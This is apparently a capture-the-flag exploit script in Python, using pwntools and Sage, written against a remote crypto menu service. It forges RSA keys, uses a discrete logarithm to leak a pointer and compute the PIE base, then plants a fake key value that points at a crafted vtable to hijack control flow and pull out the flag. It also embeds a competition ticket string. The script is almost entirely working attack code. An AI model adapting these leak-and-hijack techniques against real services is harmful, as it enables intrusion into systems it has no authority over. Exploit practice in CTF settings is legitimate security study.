#!/usr/bin/env python3

from Crypto.Util.number import *
from pwn import *
from sage.all import *

context.update(arch='amd64', os='linux')
p, u = pack, unpack

REMOTE = False
#context.log_level = "DEBUG"

if REMOTE:
    host = "crypto-challenge-lpw5gjiu6sqxi.shellweplayaga.me"
    port = 31337
else:
    host, port = '127.0.0.1 65400'.split()
    port = int(port)

s = remote(host, port)

if REMOTE:
    s.sendlineafter(":", "ticket\{TradewindCormorant1816n22:6rqNVVdqPbCzk350O2o7UTcN_Z_CJd_CrabcfpwMhf6eg0qK\}")

def dlog(pt, ct, n):
    return discrete_log(Mod(ct, n), Mod(pt, n))

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        return 0
    else:
        return x % m

def lcm(a, b):
    return a * (b // GCD(a, b))

def create_key(algo, key1=None, key2=None, key3=None):
    s.recvuntil(b'> ')
    s.send(b'0\n')
    s.recvuntil(b'> ')
    s.send(b'%d\n' % algo)
    if algo == 2:
        s.recvuntil(b'> ')
        s.send(b'0x%x\n' % key1)
    elif algo == 3:
        s.recvuntil(b'> ')
        s.send(b'0x%x\n' % key1)
        s.recvuntil(b'> ')
        s.send(b'0x%x\n' % key2)
        s.recvuntil(b'> ')
        s.send(b'0x%x\n' % key3)


def encrypt(key, message):
    s.recvuntil(b'> ')
    s.send(b'1\n')
    s.recvuntil(b'> ')
    s.send(b'%d\n' % key)
    s.recvuntil(b'> ')
    s.send(message)
    s.recvuntil(b'Your encrypted message is:\n\n')
    return s.recvuntil(b'\n\n', True)


def decrypt(key, lines, message):
    s.recvuntil(b'> ')
    s.send(b'2\n')
    s.recvuntil(b'> ')
    s.send(b'%d\n' % key)
    s.recvuntil(b'> ')
    s.send(b'%d\n' % lines)
    s.recvuntil(b'> ')
    s.send(message)
    res = s.recvuntil(b'\n\n')
    if b'You seem to be using this key a lot. Would you like to speed things up?' in res:
        s.send(b'y\n')
        s.recvuntil(b'\n\n')
        s.recvuntil(b'\n\n')
    return s.recvuntil(b'\n\n', True)


def gen_keys(size):
    assert size == 0xc  # TODO
    assert 0xc <= size <= 0x10
    # p = getPrime(size*8)
    # q = getPrime(size*8)
    p = 0xe1c73ab54ff393efb500a94d
    q = 0x84f1d81008f1f0e4c169a25b
    n = p * q
    phi = (p - 1) * (q - 1)

    e = 0x10001
    d = modinv(e, phi)

    assert (pow(pow(1234, e, n), d, n) == 1234)
    # first key check
    # k1 = e
    # k2 = d
    # k3 = n
    # second key check
    k1 = e
    k2 = p
    k3 = q
    print(hex(k1))
    print(hex(k2))
    print(hex(k3))

    return k1, k2, k3

p = 0xe1c73ab54ff393efb500a94d
q = 0x84f1d81008f1f0e4c169a25b
n = p * q
e = 0x10001
phi = (p - 1) * (q - 1)

create_key(3, *gen_keys(0xc))
enc = encrypt(0, b'A\n')

create_key(0)
create_key(0)

for _ in range(10):
   decrypted = decrypt(0, 1, (b"0x"+ b"A" * 32 + b'\n'))

leaked_p_base = 0x48474645444342410000000000025A48

dec = decrypt(0, 1, b'0xA'+ b'\n')
dec = int.from_bytes(dec, byteorder='big')

# CRT? Why bother? Sage crunches this in ~5s :)
def dlog(pt, ct, n):
    return discrete_log(Mod(ct, n), Mod(pt, n))

kn = dlog(0xa, dec, n) * 0x10001 - 1
# quotient << val / diff_val, so simple division works
quotient = kn // 0x48474645444342410000550000000a48
assert kn % quotient == 0
leaked_p = kn // quotient + 1

print("[+] leaked_p : 0x%x"% leaked_p)

pie_base = (leaked_p & 0xffffffffffffffff) - 0x25a48
print("[+] pie base : 0x%x"%pie_base)

# set fake_d as vtable_address
fake_vtable = pie_base + 0x25A70
fake_d = 0xf00000000000000000000000 | fake_vtable

while True:
    fake_e = modinv(fake_d, leaked_p - 1)
    if fake_e % 2 == 1: break
    fake_d += 0x10000000000000000

#print(hex(fake_e), hex(fake_d), hex(leaked_p))

create_key(3, fake_e, p, q)

create_key(0)
create_key(0)

for _ in range(10):
   decrypted = decrypt(3, 1, (b"0x"+ b"A" * 32 + b'\n'))

enc = int(encrypt(4, b"a" * 0x40 + b"\n"),16)
enc_byte = enc.to_bytes(0x40, byteorder="big")

flag = ""
for i in range(len(enc_byte)):
    flag += chr(enc_byte[i] ^ ord("a"))

print("[+] flag : %s"%flag)


s.interactive(prompt='')
